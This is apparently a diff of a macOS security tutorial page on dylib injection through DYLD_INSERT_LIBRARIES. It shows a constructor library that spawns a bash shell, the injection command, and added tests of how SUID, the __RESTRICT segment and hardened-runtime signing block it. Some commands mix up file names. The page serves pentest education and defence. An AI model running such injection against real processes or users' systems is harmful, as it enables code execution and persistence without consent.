@@ -12,22 +12,22 @@
 
 </details>
 
-### Basic example
+## Basic example
 
 **Library to inject** to execute a shell:
 
 ```c
-// gcc -dynamiclib example.c -o example.dylib
+// gcc -dynamiclib -o inject.dylib inject.c
 
-#include <stdio.h>
 #include <syslog.h>
+#include <stdio.h>
 #include <unistd.h>
 __attribute__((constructor))
 
 int myconstructor(int argc, const char **argv)
 {
-    printf("[+] dylib injected in %s\n", argv[0]);
     syslog(LOG_ERR, "[+] dylib injected in %s\n", argv[0]);
+    printf("[+] dylib injected in %s\n", argv[0]);
     execv("/bin/bash", 0);
 }
 ```
@@ -48,16 +48,55 @@ int main()
 Injection:
 
 ```bash
-DYLD_INSERT_LIBRARIES=example.dylib ./hello
+DYLD_INSERT_LIBRARIES=inject.dylib ./hello
 ```
 
-### Bigger Scale
+## Bigger Scale
 
-If you are planing on trying to inject libraries in unexpected binaries you could check the event messages to find out when the library is loaded inside a process (in this case remove the printf and the `/bin/bash` executeion).
+If you are planing on trying to inject libraries in unexpected binaries you could check the event messages to find out when the library is loaded inside a process (in this case remove the printf and the `/bin/bash` execution).
 
 ```bash
 sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "dylib injected"'
 ```
+
+## Check restrictions
+
+### SUID & SGID
+
+```bash
+# Make it owned by root and suid
+sudo chown root hello
+sudo chmod +s hello
+# Insert the library
+DYLD_INSERT_LIBRARIES=inject.dylib ./hello
+
+# Remove suid
+sudo chmod -s hello
+```
+
+### Section `__RESTRICT` with segment `__restrict`
+
+```bash
+gcc -sectcreate __RESTRICT __restrict /dev/null hello.c -o hello-restrict
+DYLD_INSERT_LIBRARIES=inject.dylib ./hello-restrict
+```
+
+### Hardened runtime
+
+Create a new certificate in the Keychain and use it to sign the binary:
+
+{% code overflow="wrap" %}
+```bash
+codesign -s <cert-name> --option=runtime ./hello
+DYLD_INSERT_LIBRARIES=inject.dylib ./hello
+
+codesign -f -s <cert-name> --option=library ./hello
+DYLD_INSERT_LIBRARIES=example.dylib ./hello-signed #Will throw an error because signature of binary and library aren't signed by same cert
+
+codesign -s <cert-name> inject.dylib
+DYLD_INSERT_LIBRARIES=example.dylib ./hello-signed #Throw an error because an Apple dev certificate is needed
+```
+{% endcode %}
 
 <details>
 
